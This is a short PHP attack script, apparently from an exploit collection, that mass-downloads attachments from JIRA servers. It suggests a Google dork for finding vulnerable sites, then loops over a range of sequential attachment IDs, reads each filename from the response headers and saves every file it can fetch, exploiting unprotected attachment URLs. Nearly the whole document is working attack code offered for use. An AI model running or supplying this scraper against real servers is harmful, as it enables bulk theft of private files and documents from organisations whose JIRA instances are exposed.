<?php

/*If it's a https, you MUST especify it on the URL or it won't work.
Try using numbers that you get from your results in google otherwise
you will get a lot of 404*/


echo "\n#########################################################
###################
# \n#Attachment downloader by Ignacio Garrido\n#";

if ($argc != 4){echo "
#Usage: php Scuarji.php vulnsite FROM(NUMBER) TO(NUMBER)\n#
#Dork: inurl:/jira/secure/attachment/\n#
#Example: php Scuarji.php http://www.vulnsite/jira/secure/attachment/
1 12310371#
############################################################################\n";die;}

else{
echo "\n#Let's start!\n";
echo "#\n#Ign.sec@Gmail.com\n";
#\n############################################################################\n";}

$url2 = $argv[1];

if (substr($url2,0,7) != "http://" && substr($url2,0,8) != "https://")
{
$url = ("http://".$url2);
}
else
{
$url = $argv[1];
}

if ($argv[2] >= $argv[3])
{
echo "\n\n#The second number must be bigger than the first one\n";
die;
}

$numero = $argv[2];

for ($numero;$numero <= $argv[3];$numero++)
{
$head = get_headers("$url$numero/");

if (substr ($head[0],9,3) == "404")
{
echo "\n#File number $numero not found! (404)\n";
}
else{
$explodeo = explode("filename*=",$head[2]);
$explodeo2 = explode(";",$explodeo[1]);
$archivo = substr($explodeo2[0],7);

echo "\n#Downloading file: $archivo\n";
$file=file_get_contents("$url$numero/$archivo");
file_put_contents($archivo,$file);

}
}
echo "\n#All attachment downloaded correctly!\n";
die;

?>

